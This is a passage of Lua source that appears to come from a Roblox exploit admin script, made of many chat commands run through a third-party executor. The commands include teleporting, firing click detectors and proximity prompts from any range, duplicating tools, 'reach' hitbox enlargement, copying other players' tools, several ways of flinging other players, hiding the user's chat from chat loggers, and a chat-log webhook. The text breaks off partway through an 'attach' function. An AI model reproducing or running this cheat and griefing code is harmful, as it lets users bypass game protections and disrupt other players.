						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					wait(gotopartDelay)
					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
				end
			end
		end)
	
		addcmd('gotomodel',{'tomodel'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					wait(gotopartDelay)
					getRoot(speaker.Character).CFrame = v:GetModelCFrame()
				end
			end
		end)
	
		addcmd('tweengotomodel',{'tgotomodel','ttomodel'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					wait(gotopartDelay)
					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v:GetModelCFrame()}):Play()
				end
			end
		end)
	
		addcmd('gotopartdelay',{},function(args, speaker)
			local gtpDelay = args[1] or 0.1
			if isNumber(gtpDelay) then
				gotopartDelay = gtpDelay
			end
		end)
	
		addcmd('noclickdetectorlimits',{'nocdlimits','removecdlimits'},function(args, speaker)
			for i,v in ipairs(workspace:GetDescendants()) do
				if v:IsA("ClickDetector") then
					v.MaxActivationDistance = math.huge
				end
			end
		end)
	
		addcmd('fireclickdetectors',{'firecd','firecds'}, function(args, speaker)
			if fireclickdetector then
				if args[1] then
					local name = getstring(1)
					for _, descendant in ipairs(workspace:GetDescendants()) do
						if descendant:IsA("ClickDetector") and descendant.Name == name or descendant.Parent.Name == name then
							fireclickdetector(descendant)
						end
					end
				else
					for _, descendant in ipairs(workspace:GetDescendants()) do
						if descendant:IsA("ClickDetector") then
							fireclickdetector(descendant)
						end
					end
				end
			else
				notify("Incompatible Exploit", "Your exploit does not support this command (missing fireclickdetector)")
			end
		end)
	
		addcmd('noproximitypromptlimits',{'nopplimits','removepplimits'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("ProximityPrompt") then
					v.MaxActivationDistance = math.huge
				end
			end
		end)
	
		addcmd('fireproximityprompts',{'firepp'},function(args, speaker)
			if fireproximityprompt then
				if args[1] then
					local name = getstring(1)
					for _, descendant in ipairs(workspace:GetDescendants()) do
						if descendant:IsA("ProximityPrompt") and descendant.Name == name or descendant.Parent.Name == name then
							fireproximityprompt(descendant)
						end
					end
				else
					for _, descendant in ipairs(workspace:GetDescendants()) do
						if descendant:IsA("ProximityPrompt") then
							fireproximityprompt(descendant)
						end
					end
				end
			else
				notify("Incompatible Exploit", "Your exploit does not support this command (missing fireproximityprompt)")
			end
		end)
	
		local PromptButtonHoldBegan = nil
		addcmd('instantproximityprompts',{'instantpp'},function(args, speaker)
			if fireproximityprompt then
				execCmd("uninstantproximityprompts")
				wait(0.1)
				PromptButtonHoldBegan = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
					fireproximityprompt(prompt)
				end)
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing fireproximityprompt)')
			end
		end)
	
		addcmd('uninstantproximityprompts',{'uninstantpp'},function(args, speaker)
			if PromptButtonHoldBegan ~= nil then
				PromptButtonHoldBegan:Disconnect()
				PromptButtonHoldBegan = nil
			end
		end)
	
		addcmd('notifyping',{'ping'},function(args, speaker)
			notify("Ping", math.round(speaker:GetNetworkPing() * 1000) .. "ms")
		end)
	
		addcmd('grabtools', {}, function(args, speaker)
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			for _, child in ipairs(workspace:GetChildren()) do
				if speaker.Character and child:IsA("BackpackItem") and child:FindFirstChild("Handle") then
					humanoid:EquipTool(child)
				end
			end
	
			if grabtoolsFunc then 
				grabtoolsFunc:Disconnect() 
			end
	
			grabtoolsFunc = workspace.ChildAdded:Connect(function(child)
				if speaker.Character and child:IsA("BackpackItem") and child:FindFirstChild("Handle") then
					humanoid:EquipTool(child)
				end
			end)
	
			notify("Grabtools", "Picking up any dropped tools")
		end)
	
		addcmd('nograbtools',{'ungrabtools'},function(args, speaker)
			if grabtoolsFunc then 
				grabtoolsFunc:Disconnect() 
			end
	
			notify("Grabtools", "Grabtools has been disabled")
		end)
	
		local specifictoolremoval = {}
		addcmd('removespecifictool',{},function(args, speaker)
			if args[1] and speaker:FindFirstChildOfClass("Backpack") then
				local tool = string.lower(getstring(1))
				local RST = RunService.RenderStepped:Connect(function()
					if speaker:FindFirstChildOfClass("Backpack") then
						for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
							if v.Name:lower() == tool then
								v:Remove()
							end
						end
					end
				end)
				specifictoolremoval[tool] = RST
			end
		end)
	
		addcmd('unremovespecifictool',{},function(args, speaker)
			if args[1] then
				local tool = string.lower(getstring(1))
				if specifictoolremoval[tool] ~= nil then
					specifictoolremoval[tool]:Disconnect()
					specifictoolremoval[tool] = nil
				end
			end
		end)
	
		addcmd('clearremovespecifictool',{},function(args, speaker)
			for obj in pairs(specifictoolremoval) do
				specifictoolremoval[obj]:Disconnect()
				specifictoolremoval[obj] = nil
			end
		end)
	
		addcmd('light',{},function(args, speaker)
			local light = Instance.new("PointLight")
			light.Parent = getRoot(speaker.Character)
			light.Range = 30
			if args[1] then
				light.Brightness = args[2]
				light.Range = args[1]
			else
				light.Brightness = 5
			end
		end)
	
		addcmd('unlight',{'nolight'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v.ClassName == "PointLight" then
					v:Destroy()
				end
			end
		end)
	
		addcmd('copytools',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				task.spawn(function()
					for i,v in pairs(Players[v]:FindFirstChildOfClass("Backpack"):GetChildren()) do
						if v:IsA('Tool') or v:IsA('HopperBin') then
							v:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
						end
					end
				end)
			end
		end)
	
		addcmd('naked',{},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
					v:Destroy()
				end
			end
		end)
	
		addcmd('noface',{'removeface'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA("Decal") and v.Name == 'face' then
					v:Destroy()
				end
			end
		end)
	
		addcmd('spawnpoint',{'spawn'},function(args, speaker)
			spawnpos = getRoot(speaker.Character).CFrame
			spawnpoint = true
			spDelay = tonumber(args[1]) or 0.1
			notify('Spawn Point','Spawn point created at '..tostring(spawnpos))
		end)
	
		addcmd('nospawnpoint',{'nospawn','removespawnpoint'},function(args, speaker)
			spawnpoint = false
			notify('Spawn Point','Removed spawn point')
		end)
	
		addcmd('flashback',{'diedtp'},function(args, speaker)
			if lastDeath ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				getRoot(speaker.Character).CFrame = lastDeath
			end
		end)
	
		addcmd('hatspin',{'spinhats'},function(args, speaker)
			execCmd('unhatspin')
			wait(.5)
			for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
				local keep = Instance.new("BodyPosition") keep.Name = randomString() keep.Parent = v.Handle
				local spin = Instance.new("BodyAngularVelocity") spin.Name = randomString() spin.Parent = v.Handle
				v.Handle:FindFirstChildOfClass("Weld"):Destroy()
				if args[1] then
					spin.AngularVelocity = Vector3.new(0, args[1], 0)
					spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
				else
					spin.AngularVelocity = Vector3.new(0, 100, 0)
					spin.MaxTorque = Vector3.new(0, 200, 0)
				end
				keep.P = 30000
				keep.D = 50
				spinhats = RunService.Stepped:Connect(function()
					pcall(function()
						keep.Position = Players.LocalPlayer.Character.Head.Position
					end)
				end)
			end
		end)
	
		addcmd('unhatspin',{'unspinhats'},function(args, speaker)
			if spinhats then
				spinhats:Disconnect()
			end
			for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
				v.Parent = workspace
				for i,c in pairs(v.Handle) do
					if c:IsA("BodyPosition") or c:IsA("BodyAngularVelocity") then
						c:Destroy()
					end
				end
				wait()
				v.Parent = speaker.Character
			end
		end)
	
		addcmd('clearhats',{'cleanhats'},function(args, speaker)
			if firetouchinterest then
				local Player = Players.LocalPlayer
				local Character = Player.Character
				local Old = Character:FindFirstChild("HumanoidRootPart").CFrame
				local Hats = {}
	
				for _, child in ipairs(workspace:GetChildren()) do
					if child:IsA("Accessory") then
						table.insert(Hats, child)
					end
				end
	
				for _, accessory in ipairs(Character:FindFirstChildOfClass("Humanoid"):GetAccessories()) do
					accessory:Destroy()
				end
	
				for i = 1, #Hats do
					repeat RunService.Heartbeat:wait() until Hats[i]
					firetouchinterest(Hats[i].Handle,Character:FindFirstChild("HumanoidRootPart"),0)
					repeat RunService.Heartbeat:wait() until Character:FindFirstChildOfClass("Accessory")
					Character:FindFirstChildOfClass("Accessory"):Destroy()
					repeat RunService.Heartbeat:wait() until not Character:FindFirstChildOfClass("Accessory")
				end
	
				execCmd("reset")
	
				Player.CharacterAdded:Wait()
	
				for i = 1,20 do 
					RunService.Heartbeat:Wait()
					if Player.Character:FindFirstChild("HumanoidRootPart") then
						Player.Character:FindFirstChild("HumanoidRootPart").CFrame = Old
					end
				end
			else
				notify("Incompatible Exploit","Your exploit does not support this command (missing firetouchinterest)")
			end
		end)
	
		addcmd('split',{},function(args, speaker)
			if r15(speaker) then
				speaker.Character.UpperTorso.Waist:Destroy()
			else
				notify('R15 Required','This command requires the r15 rig type')
			end
		end)
	
		addcmd('nilchar',{},function(args, speaker)
			if speaker.Character ~= nil then
				speaker.Character.Parent = nil
			end
		end)
	
		addcmd('unnilchar',{'nonilchar'},function(args, speaker)
			if speaker.Character ~= nil then
				speaker.Character.Parent = workspace
			end
		end)
	
		addcmd('noroot',{'removeroot','rroot'},function(args, speaker)
			if speaker.Character ~= nil then
				local char = Players.LocalPlayer.Character
				char.Parent = nil
				char.HumanoidRootPart:Destroy()
				char.Parent = workspace
			end
		end)
	
		addcmd('replaceroot',{'replacerootpart'},function(args, speaker)
			if speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
				local Char = speaker.Character
				local OldParent = Char.Parent
				local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
				local OldPos = HRP.CFrame
				Char.Parent = game
				local HRP1 = HRP:Clone()
				HRP1.Parent = Char
				HRP = HRP:Destroy()
				HRP1.CFrame = OldPos
				Char.Parent = OldParent
			end
		end)
	
		addcmd('clearcharappearance',{'clearchar','clrchar'},function(args, speaker)
			speaker:ClearCharacterAppearance()
		end)
	
		addcmd('equiptools',{},function(args, speaker)
			for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
				if v:IsA("Tool") or v:IsA("HopperBin") then
					v.Parent = speaker.Character
				end
			end
		end)
	
		addcmd('unequiptools',{},function(args, speaker)
			speaker.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
		end)
	
		local function GetHandleTools(p)
			p = p or Players.LocalPlayer
			local r = {}
			for _, v in ipairs(p.Character and p.Character:GetChildren() or {}) do
				if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
					r[#r + 1] = v
				end
			end
			for _, v in ipairs(p.Backpack:GetChildren()) do
				if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
					r[#r + 1] = v
				end
			end
			return r
		end
		addcmd('dupetools', {'clonetools'}, function(args, speaker)
			local LOOP_NUM = tonumber(args[1]) or 1
			local OrigPos = speaker.Character.HumanoidRootPart.Position
			local Tools, TempPos = {}, Vector3.new(math.random(-2e5, 2e5), 2e5, math.random(-2e5, 2e5))
			for i = 1, LOOP_NUM do
				local Human = speaker.Character:WaitForChild("Humanoid")
				wait(.1, Human.Parent:MoveTo(TempPos))
				Human.RootPart.Anchored = speaker:ClearCharacterAppearance(wait(.1)) or true
				local t = GetHandleTools(speaker)
				while #t > 0 do
					for _, v in ipairs(t) do
						task.spawn(function()
							for _ = 1, 25 do
								v.Parent = speaker.Character
								v.Handle.Anchored = true
							end
							for _ = 1, 5 do
								v.Parent = workspace
							end
							table.insert(Tools, v.Handle)
						end)
					end
					t = GetHandleTools(speaker)
				end
				wait(.1)
				speaker.Character = speaker.Character:Destroy()
				speaker.CharacterAdded:Wait():WaitForChild("Humanoid").Parent:MoveTo(LOOP_NUM == i and OrigPos or TempPos, wait(.1))
				if i == LOOP_NUM or i % 5 == 0 then
					local HRP = speaker.Character.HumanoidRootPart
					if type(firetouchinterest) == "function" then
						for _, v in ipairs(Tools) do
							v.Anchored = not firetouchinterest(v, HRP, 1, firetouchinterest(v, HRP, 0)) and false or false
						end
					else
						for _, v in ipairs(Tools) do
							task.spawn(function()
								local x = v.CanCollide
								v.CanCollide = false
								v.Anchored = false
								for _ = 1, 10 do
									v.CFrame = HRP.CFrame
									wait()
								end
								v.CanCollide = x
							end)
						end
					end
					wait(.1)
					Tools = {}
				end
				TempPos = TempPos + Vector3.new(10, math.random(-5, 5), 0)
			end
		end)
	
		local RS = RunService.RenderStepped
	
		addcmd('touchinterests', {'touchinterest', 'firetouchinterests', 'firetouchinterest'}, function(args, speaker)
			if not firetouchinterest then
				notify("Incompatible Exploit", "Your exploit does not support this command (missing firetouchinterest)")
				return
			end
	
			local root = getRoot(speaker.Character) or speaker.Character:FindFirstChildWhichIsA("BasePart")
	
			local function touch(x)
				x = x:FindFirstAncestorWhichIsA("Part")
				if x then
					if firetouchinterest then
						task.spawn(function()
							firetouchinterest(x, root, 1)
							wait()
							firetouchinterest(x, root, 0)
						end)
					end
					x.CFrame = root.CFrame
				end
			end
	
			if args[1] then
				local name = getstring(1)
				for _, descendant in ipairs(workspace:GetDescendants()) do
					if descendant:IsA("TouchTransmitter") and descendant.Name == name or descendant.Parent.Name == name then
						touch(descendant)
					end
				end
			else
				for _, descendant in ipairs(workspace:GetDescendants()) do
					if descendant:IsA("TouchTransmitter") then
						touch(descendant)
					end
				end
			end
		end)
	
		addcmd('fullbright',{'fb','fullbrightness'},function(args, speaker)
			Lighting.Brightness = 2
			Lighting.ClockTime = 14
			Lighting.FogEnd = 100000
			Lighting.GlobalShadows = false
			Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end)
	
		addcmd('loopfullbright',{'loopfb'},function(args, speaker)
			if brightLoop then
				brightLoop:Disconnect()
			end
			local function brightFunc()
				Lighting.Brightness = 2
				Lighting.ClockTime = 14
				Lighting.FogEnd = 100000
				Lighting.GlobalShadows = false
				Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
			end
	
			brightLoop = RunService.RenderStepped:Connect(brightFunc)
		end)
	
		addcmd('unloopfullbright',{'unloopfb'},function(args, speaker)
			if brightLoop then
				brightLoop:Disconnect()
			end
		end)
	
		addcmd('ambient',{},function(args, speaker)
			Lighting.Ambient = Color3.new(args[1],args[2],args[3])
			Lighting.OutdoorAmbient = Color3.new(args[1],args[2],args[3])
		end)
	
		addcmd('day',{},function(args, speaker)
			Lighting.ClockTime = 14
		end)
	
		addcmd('night',{},function(args, speaker)
			Lighting.ClockTime = 0
		end)
	
		addcmd('nofog',{},function(args, speaker)
			Lighting.FogEnd = 100000
			for i,v in pairs(Lighting:GetDescendants()) do
				if v:IsA("Atmosphere") then
					v:Destroy()
				end
			end
		end)
	
		addcmd('brightness',{},function(args, speaker)
			Lighting.Brightness = args[1]
		end)
	
		addcmd('globalshadows',{'gshadows'},function(args, speaker)
			Lighting.GlobalShadows = true
		end)
	
		addcmd('unglobalshadows',{'nogshadows','ungshadows','noglobalshadows'},function(args, speaker)
			Lighting.GlobalShadows = false
		end)
	
		origsettings = {abt = Lighting.Ambient, oabt = Lighting.OutdoorAmbient, brt = Lighting.Brightness, time = Lighting.ClockTime, fe = Lighting.FogEnd, fs = Lighting.FogStart, gs = Lighting.GlobalShadows}
	
		addcmd('restorelighting',{'rlighting'},function(args, speaker)
			Lighting.Ambient = origsettings.abt
			Lighting.OutdoorAmbient = origsettings.oabt
			Lighting.Brightness = origsettings.brt
			Lighting.ClockTime = origsettings.time
			Lighting.FogEnd = origsettings.fe
			Lighting.FogStart = origsettings.fs
			Lighting.GlobalShadows = origsettings.gs
		end)
	
		addcmd('stun',{'platformstand'},function(args, speaker)
			speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
		end)
	
		addcmd('unstun',{'nostun','unplatformstand','noplatformstand'},function(args, speaker)
			speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
		end)
	
		addcmd('norotate',{'noautorotate'},function(args, speaker)
			speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = false
		end)
	
		addcmd('unnorotate',{'autorotate'},function(args, speaker)
			speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = true
		end)
	
		addcmd('enablestate',{},function(args, speaker)
			local x = args[1]
			if not tonumber(x) then
				local x = Enum.HumanoidStateType[args[1]]
			end
			speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, true)
		end)
	
		addcmd('disablestate',{},function(args, speaker)
			local x = args[1]
			if not tonumber(x) then
				local x = Enum.HumanoidStateType[args[1]]
			end
			speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, false)
		end)
	
		addcmd('drophats',{'drophat'},function(args, speaker)
			if speaker.Character then
				for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
					v.Parent = workspace
				end
			end
		end)
	
		addcmd('deletehats',{'nohats','rhats'},function(args, speaker)
			for i,v in next, speaker.Character:GetDescendants() do
				if v:IsA("Accessory") then
					for i,p in next, v:GetDescendants() do
						if p:IsA("Weld") then
							p:Destroy()
						end
					end
				end
			end
		end)
	
		addcmd('droptools',{'droptool'},function(args, speaker)
			for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = Players.LocalPlayer.Character
				end
			end
			wait()
			for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = workspace
				end
			end
		end)
	
		addcmd('droppabletools',{},function(args, speaker)
			if speaker.Character then
				for _,obj in pairs(speaker.Character:GetChildren()) do
					if obj:IsA("Tool") then
						obj.CanBeDropped = true
					end
				end
			end
			if speaker:FindFirstChildOfClass("Backpack") then
				for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
					if obj:IsA("Tool") then
						obj.CanBeDropped = true
					end
				end
			end
		end)
	
		local currentToolSize = ""
		local currentGripPos = ""
		addcmd('reach',{},function(args, speaker)
			execCmd('unreach')
			wait()
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA("Tool") then
					if args[1] then
						currentToolSize = v.Handle.Size
						currentGripPos = v.GripPos
						local a = Instance.new("SelectionBox")
						a.Name = "SelectionBoxCreated"
						a.Parent = v.Handle
						a.Adornee = v.Handle
						v.Handle.Massless = true
						v.Handle.Size = Vector3.new(0.5,0.5,args[1])
						v.GripPos = Vector3.new(0,0,0)
						speaker.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
					else
						currentToolSize = v.Handle.Size
						currentGripPos = v.GripPos
						local a = Instance.new("SelectionBox")
						a.Name = "SelectionBoxCreated"
						a.Parent = v.Handle
						a.Adornee = v.Handle
						v.Handle.Massless = true
						v.Handle.Size = Vector3.new(0.5,0.5,60)
						v.GripPos = Vector3.new(0,0,0)
						speaker.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
					end
				end
			end
		end)
	
		addcmd("boxreach", {}, function(args, speaker)
			execCmd("unreach")
			wait()
			for i, v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA("Tool") then
					local size = tonumber(args[1]) or 60
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(size, size, size)
					v.GripPos = Vector3.new(0, 0, 0)
					speaker.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
				end
			end
		end)
	
		addcmd('unreach',{'noreach','unboxreach'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA("Tool") then
					v.Handle.Size = currentToolSize
					v.GripPos = currentGripPos
					v.Handle.SelectionBoxCreated:Destroy()
				end
			end
		end)
	
		addcmd('grippos',{},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA("Tool") then
					v.Parent = speaker:FindFirstChildOfClass("Backpack")
					v.GripPos = Vector3.new(args[1],args[2],args[3])
					v.Parent = speaker.Character
				end
			end
		end)
	
		addcmd('usetools', {}, function(args, speaker)
			local Backpack = speaker:FindFirstChildOfClass("Backpack")
			local amount = tonumber(args[1]) or 1
			local delay_ = tonumber(args[2]) or false
			for _, v in ipairs(Backpack:GetChildren()) do
				v.Parent = speaker.Character
				task.spawn(function()
					for _ = 1, amount do
						v:Activate()
						if delay_ then
							wait(delay_)
						end
					end
					v.Parent = Backpack
				end)
			end
		end)
	
		addcmd('logs',{},function(args, speaker)
			logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
		end)
	
		addcmd('chatlogs',{'clogs'},function(args, speaker)
			join.Visible = false
			chat.Visible = true
			table.remove(shade3,table.find(shade3,selectChat))
			table.remove(shade2,table.find(shade2,selectJoin))
			table.insert(shade2,selectChat)
			table.insert(shade3,selectJoin)
			selectJoin.BackgroundColor3 = currentShade3
			selectChat.BackgroundColor3 = currentShade2
			logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
		end)
	
		addcmd('joinlogs',{'jlogs'},function(args, speaker)
			chat.Visible = false
			join.Visible = true	
			table.remove(shade3,table.find(shade3,selectJoin))
			table.remove(shade2,table.find(shade2,selectChat))
			table.insert(shade2,selectJoin)
			table.insert(shade3,selectChat)
			selectChat.BackgroundColor3 = currentShade3
			selectJoin.BackgroundColor3 = currentShade2
			logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
		end)
	
		addcmd("chatlogswebhook", {"logswebhook"}, function(args, speaker)
			if httprequest then
				logsWebhook = args[1] or nil
				updatesaves()
			else
				notify("Incompatible Exploit", "Your exploit does not support this command (missing request)")
			end
		end)
	
		addcmd("antichatlogs", {"antichatlogger"}, function(args, speaker)
			if not isLegacyChat then
				return notify("antichatlogs", "Game needs the legacy chat")
			end
			local MessagePosted, _ = pcall(function()
				rawset(require(speaker:FindFirstChild("PlayerScripts"):FindFirstChild("ChatScript").ChatMain), "MessagePosted", {
					["fire"] = function(msg)
						return msg
					end,
					["wait"] = function()
						return
					end,
					["connect"] = function()
						return
					end
				})
			end)
			notify("antichatlogs", MessagePosted and "Enabled" or "Failed to enable antichatlogs")
		end)
	
		flinging = false
		addcmd('fling',{},function(args, speaker)
			flinging = false
			for _, child in pairs(speaker.Character:GetDescendants()) do
				if child:IsA("BasePart") then
					child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
				end
			end
			execCmd('noclip')
			wait(.1)
			local bambam = Instance.new("BodyAngularVelocity")
			bambam.Name = randomString()
			bambam.Parent = getRoot(speaker.Character)
			bambam.AngularVelocity = Vector3.new(0,99999,0)
			bambam.MaxTorque = Vector3.new(0,math.huge,0)
			bambam.P = math.huge
			local Char = speaker.Character:GetChildren()
			for i, v in next, Char do
				if v:IsA("BasePart") then
					v.CanCollide = false
					v.Massless = true
					v.Velocity = Vector3.new(0, 0, 0)
				end
			end
			flinging = true
			local function flingDiedF()
				execCmd('unfling')
			end
			flingDied = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDiedF)
			repeat
				bambam.AngularVelocity = Vector3.new(0,99999,0)
				wait(.2)
				bambam.AngularVelocity = Vector3.new(0,0,0)
				wait(.1)
			until flinging == false
		end)
	
		addcmd('unfling',{'nofling'},function(args, speaker)
			execCmd('clip')
			if flingDied then
				flingDied:Disconnect()
			end
			flinging = false
			wait(.1)
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			for i,v in pairs(getRoot(speakerChar):GetChildren()) do
				if v.ClassName == 'BodyAngularVelocity' then
					v:Destroy()
				end
			end
			for _, child in pairs(speakerChar:GetDescendants()) do
				if child.ClassName == "Part" or child.ClassName == "MeshPart" then
					child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
				end
			end
		end)
	
		addcmd('togglefling',{},function(args, speaker)
			if flinging then
				execCmd('unfling')
			else
				execCmd('fling')
			end
		end)
	
		addcmd("flyfling", {}, function(args, speaker)
			execCmd("unvehiclefly\\unwalkfling")
			task.wait()
			vehicleflyspeed = tonumber(args[1]) or vehicleflyspeed
			execCmd("vehiclefly\\walkfling")
		end)
	
		addcmd("unflyfling", {}, function(args, speaker)
			execCmd("unvehiclefly\\unwalkfling\\breakvelocity")
		end)
	
		addcmd("toggleflyfling", {}, function(args, speaker)
			execCmd(flinging and "unflyfling" or "flyfling")
		end)
	
		walkflinging = false
		addcmd("walkfling", {}, function(args, speaker)
			execCmd("unwalkfling")
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			if humanoid then
				humanoid.Died:Connect(function()
					execCmd("unwalkfling")
				end)
			end
	
			execCmd("noclip nonotify")
			walkflinging = true
			repeat RunService.Heartbeat:Wait()
				local character = speaker.Character
				local root = getRoot(character)
				local vel, movel = nil, 0.1
	
				while not (character and character.Parent and root and root.Parent) do
					RunService.Heartbeat:Wait()
					character = speaker.Character
					root = getRoot(character)
				end
	
				vel = root.Velocity
				root.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
	
				RunService.RenderStepped:Wait()
				if character and character.Parent and root and root.Parent then
					root.Velocity = vel
				end
	
				RunService.Stepped:Wait()
				if character and character.Parent and root and root.Parent then
					root.Velocity = vel + Vector3.new(0, movel, 0)
					movel = movel * -1
				end
			until walkflinging == false
		end)
	
		addcmd("unwalkfling", {"nowalkfling"}, function(args, speaker)
			walkflinging = false
			execCmd("unnoclip nonotify")
		end)
	
		addcmd("togglewalkfling", {}, function(args, speaker)
			execCmd(walkflinging and "unwalkfling" or "walkfling")
		end)
	
		addcmd('invisfling',{},function(args, speaker)
			local ch = speaker.Character
			ch:FindFirstChildWhichIsA("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Dead, false)
			local prt=Instance.new("Model")
			prt.Parent = speaker.Character
			local z1 = Instance.new("Part")
			z1.Name="Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2 = Instance.new("Part")
			z2.Name="Head"
			z2.Parent = prt
			z2.Anchored = true
			z2.CanCollide = false
			local z3 =Instance.new("Humanoid")
			z3.Name="Humanoid"
			z3.Parent = prt
			z1.Position = Vector3.new(0,9999,0)
			speaker.Character=prt
			wait(3)
			speaker.Character=ch
			wait(3)
			local Hum = Instance.new("Humanoid")
			z2:Clone()
			Hum.Parent = speaker.Character
			local root =  getRoot(speaker.Character)
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v ~= root and  v.Name ~= "Humanoid" then
					v:Destroy()
				end
			end
			root.Transparency = 0
			root.Color = Color3.new(1, 1, 1)
			local invisflingStepped
			invisflingStepped = RunService.Stepped:Connect(function()
				if speaker.Character and getRoot(speaker.Character) then
					getRoot(speaker.Character).CanCollide = false
				else
					invisflingStepped:Disconnect()
				end
			end)
			sFLY()
			workspace.CurrentCamera.CameraSubject = root
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = getRoot(speaker.Character)
			bambam.Force = Vector3.new(99999,99999*10,99999)
			bambam.Location = getRoot(speaker.Character).Position
		end)
	
		addcmd("antifling", {}, function(args, speaker)
			if antifling then
				antifling:Disconnect()
				antifling = nil
			end
			antifling = RunService.Stepped:Connect(function()
				for _, player in pairs(Players:GetPlayers()) do
					if player ~= speaker and player.Character then
						for _, v in pairs(player.Character:GetDescendants()) do
							if v:IsA("BasePart") then
								v.CanCollide = false
							end
						end
					end
				end
			end)
		end)
	
		addcmd("unantifling", {}, function(args, speaker)
			if antifling then
				antifling:Disconnect()
				antifling = nil
			end
		end)
	
		addcmd("toggleantifling", {}, function(args, speaker)
			execCmd(antifling and "unantifling" or "antifling")
		end)
	
		function attach(speaker,target)
			if tools(speaker) then
				local char = speaker.Character
				local tchar = target.Character
				local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
				local hrp = getRoot(speaker.Character)
				local hrp2 = getRoot(target.Character)
				hum.Name = "1"
				local newHum = hum:Clone()
				newHum.Parent = char
				newHum.Name = "Humanoid"
				wait()
				hum:Destroy()
				workspace.CurrentCamera.CameraSubject = char
				newHum.DisplayDistanceType = "None"
				local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
				tool.Parent = char
				hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
				local n = 0
				repeat
					wait(.1)
					n = n + 1
					hrp.CFrame = hrp2.CFrame
